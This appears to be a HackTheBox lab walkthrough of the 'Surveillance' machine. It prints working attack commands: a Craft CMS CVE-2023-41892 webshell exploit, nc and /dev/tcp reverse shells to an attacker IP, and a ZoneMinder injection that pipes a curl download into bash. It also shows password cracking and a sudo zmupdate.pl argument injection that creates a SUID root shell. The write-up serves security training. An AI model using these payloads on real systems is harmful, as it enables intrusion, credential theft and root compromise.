---
layout: post
title: HackTheBox Surveillance
date: 2024-09-12
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Surveillance is a medium-difficulty Linux machine that showcases a vulnerability (`[CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892)`) in Craft CMS, which abuses PHP object injection to inject PHP content into the Craft CMS web log files to gain Remote Code Execution (RCE). The privilege escalation abuses ZoneMinder with an authenticated remote code injection in the `HostController.php` API endpoint to gain a shell as the `zoneminder` user. As this user, a `sudo` entry is abused by adding a configuration environment variable `LD_PRELOAD` via the admin panel and loading the malicious library file through `zmdc.dl` on the target, compromising the system. ([Source](https://app.hackthebox.com/machines/Surveillance/information))

# Enumeration

```bash
$ nmap -sC -sV 10.10.11.245
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.245
Host is up (0.0042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
```

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/website.png?raw=true)

```bash
$ feroxbuster -u http://surveillance.htb -q --filter-status 404,503
...
301      GET        7l       12w      178c http://surveillance.htb/images => http://surveillance.htb/images/
301      GET        7l       12w      178c http://surveillance.htb/img => http://surveillance.htb/img/
301      GET        7l       12w      178c http://surveillance.htb/js => http://surveillance.htb/js/
301      GET        7l       12w      178c http://surveillance.htb/css => http://surveillance.htb/css/
302      GET        0l        0w        0c http://surveillance.htb/admin => http://surveillance.htb/admin/login
...
```

![login_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/login_webpage.png?raw=true)

There login page did not display the version of the CMS but the source code of the index page did.

```html
<!-- footer section -->
<section class="footer_section">
    <div class="container">
        <p>
            &copy; <span id="displayYear"></span> All Rights Reserved By
            SURVEILLANCE.HTB</a><br> <b>Powered by <a href="https://github.com/craftcms/cms/tree/4.4.14"/>Craft CMS</a></b>
    	</p>
    </div>
</section>
```

# Exploitation

Searching for `CraftCMS 4.4.14 exploit` resulted in CVE-2023-41892. Used the exploit code from this [GitHub repository](https://github.com/Faelian/CraftCMS_CVE-2023-41892).

```bash
$ python3 craft-cms.py http://surveillance.htb
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web
[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you're done
[!] Enjoy your shell
> whoami
www-data
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 9999 >/tmp/f
```

```bash
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.245] 45450
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web$ cd /home
www-data@surveillance:/home$ ls
matthew
zoneminder
```

Found a `.env` file.

```bash
www-data@surveillance:~/html/craft$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/4.x/config/

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# The secure key Craft will use for hashing and encrypting data
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_

# Database connection settings
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

# General settings (see config/general.php)
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false

PRIMARY_SITE_URL=http://surveillance.htb/
```

Found a backup file after some enumeration.

```bash
www-data@surveillance:~/html/craft/storage/backups$ ls
surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

Copied the file over to the webserver and download the file.

```bash
www-data@surveillance:~/html/craft/web$ cp /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip .
www-data@surveillance:~/html/craft/web$ ls
cpresources
css
fonts
images
img
index.php
js
shell.php
surveillance--2023-10-17-202801--v4.4.14.sql.zip
web.config
```

```bash
$ wget http://surveillance.htb/surveillance--2023-10-17-202801--v4.4.14.sql.zip
$ unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip
Archive:  surveillance--2023-10-17-202801--v4.4.14.sql.zip
  inflating: surveillance--2023-10-17-202801--v4.4.14.sql
$  cat surveillance--2023-10-17-202801--v4.4.14.sql
-- MariaDB dump 10.19  Distrib 10.6.12-MariaDB, for debian-linux-gnu (x86_64)
--
...
LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
...
```

Identify the hash value found using `hash-identifier` and crack it using `hashcat`.

```bash
$ hash-identifier 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
...
Possible Hashs:
[+] SHA-256
[+] Haval-256

$ hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
...
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
...
```

`ssh` into the server with the credentials found.

```bash
$ ssh matthew@surveillance.htb
matthew@surveillance.htb's password: starcraft122490
matthew@surveillance:~$ 
```

# Privilege Escalation

Found a database credentials: `zmuser:ZoneMinderPassword2023`.

```bash
matthew@surveillance:/usr/share/zoneminder/www/api/app/Config$ cat database.php
...
class DATABASE_CONFIG {

	/*public $default = array(
		'datasource' => 'Database/Mysql',
		'persistent' => false,
		'login' => ZM_DB_USER,
		'password' => ZM_DB_PASS,
		'database' => ZM_DB_NAME,
		'ssl_ca' => ZM_DB_SSL_CA_CERT,
		'ssl_key' => ZM_DB_SSL_CLIENT_KEY,
		'ssl_cert' => ZM_DB_SSL_CLIENT_CERT,
		'prefix' => '',
		'encoding' => 'utf8',
	);*/

	public $test = array(
		'datasource' => 'Database/Mysql',
		'persistent' => false,
		'host' => 'localhost',
		'login' => 'zmuser',
		'password' => 'ZoneMinderPassword2023',
		'database' => 'zm',
		'prefix' => '',
		//'encoding' => 'utf8',
	);

	public function __construct() {
		if (strpos(ZM_DB_HOST, ':')):
			$array = explode(':', ZM_DB_HOST, 2);
                        if (ctype_digit($array[1])):
				$this->default['host'] = $array[0];
				$this->default['port'] = $array[1];
			else:
				$this->default['unix_socket'] = $array[1];
			endif;
		else:
			$this->default['host'] = ZM_DB_HOST;
		endif;
	}
}
```

Login to `mysql` with the credentials found.

```bash
matthew@surveillance:/usr/share/zoneminder/www/api/app/Config$ mysql -u zmuser -p
Enter password: ZoneMinderPassword2023
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2431
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
...
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| zm                 |
+--------------------+
MariaDB [(none)]> use zm
Database changed
MariaDB [zm]> show tables;
+-----------------+
| Tables_in_zm    |
+-----------------+
| Config          |
| ControlPresets  |
| Controls        |
| Devices         |
| Event_Summaries |
| Events          |
| Events_Archived |
| Events_Day      |
| Events_Hour     |
| Events_Month    |
| Events_Week     |
| Filters         |
| Frames          |
| Groups          |
| Groups_Monitors |
| Logs            |
| Manufacturers   |
| Maps            |
| Models          |
| MonitorPresets  |
| Monitor_Status  |
| Monitors        |
| MontageLayouts  |
| Servers         |
| Sessions        |
| Snapshot_Events |
| Snapshots       |
| States          |
| Stats           |
| Storage         |
| TriggersX10     |
| Users           |
| ZonePresets     |
| Zones           |
+-----------------+
MariaDB [zm]> select * from Users;
|  1 | admin    | $2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.|
```

Nothing useful was found in the MariaDB.

```bash
matthew@surveillance:~$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

Found that there is a service listening on port `8080`. 

Reconnect SSH using `-L 8888:localhost:8080` tunnel anything hitting port `8888` on Kali through the SSH session and to `TCP 8080` on `localhost` of `surveillance.htb`.

```bash
$ ssh matthew@surveillance.htb -L 8888:localhost:8080
matthew@surveillance.htb's password: starcraft122490
matthew@surveillance:~$ 
```

![localhost_website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/localhost_website.png?raw=true)

The credentials `matthew:starcraft122490` does not work but `admin:starcraft122490` works.

![zoneminder_dashboard](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/zoneminder_dashboard.png?raw=true)

This version of `ZoneMinder` is vulnerable to SQL Injection according to this [GitHub advisory](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-222j-wh8m-xjrx).

Leverage on the data from Metasploit’s [module](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/zoneminder_snapshots.rb) and craft the exploit manually on Burp.

>   -   Intercept login request.
>   -   Change the parameters according to parameters shown in Metasploit.
>       -   `data = "view=snapshot&action=create&monitor_ids[0][Id]=;#{command}"`
>   -   Forward edited request.

![intercept_login_request](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/intercept_login_request.png?raw=true)

>   `view=snapshot&action=create&monitor_ids[0][Id]=;curl+http%3a//10.10.14.5/shell|bash&__csrf_magic=key%3Af8dc3b7201112c84059d7ccd226d549fa01a6173%2C1719736107`

Create a reverse shell payload on Kali and launch the exploit.

```bash
$ cat shell
bash -i >& /dev/tcp/10.10.14.5/9999 0>&1
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![intercept_login_request_edit](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/intercept_login_request_edit.png?raw=true)

```bash
nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.245] 37204
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:/usr/share/zoneminder/www$ 
```

Check if the user has any `sudo` privileges.

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *

zoneminder@surveillance:/usr/share/zoneminder/www$ ls /usr/bin/zm*.pl
ls /usr/bin/zm*.pl
/usr/bin/zmaudit.pl
/usr/bin/zmcamtool.pl
/usr/bin/zmcontrol.pl
/usr/bin/zmdc.pl
/usr/bin/zmfilter.pl
/usr/bin/zmonvif-probe.pl
/usr/bin/zmonvif-trigger.pl
/usr/bin/zmpkg.pl
/usr/bin/zmrecover.pl
/usr/bin/zmstats.pl
/usr/bin/zmsystemctl.pl
/usr/bin/zmtelemetry.pl
/usr/bin/zmtrack.pl
/usr/bin/zmtrigger.pl
/usr/bin/zmupdate.pl
/usr/bin/zmvideo.pl
/usr/bin/zmwatch.pl
/usr/bin/zmx10.pl
```

Try abusing the `zmupdate.pl` binary.

```bash
$ zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version 1 --user ' $(touch /tmp/owo)'

zoneminder@surveillance:/usr/share/zoneminder/www$ ls -la /tmp
...
-rw-r--r--  1 root     root        0 Jun 30 08:54 owo
...

zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version 1 --user ' $(cp /bin/bash /tmp)'
...
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version 1 --user ' $(chmod u+s /tmp/bash)'
...
zoneminder@surveillance:/usr/share/zoneminder/www$ /tmp/bash -p
whoami
root
```

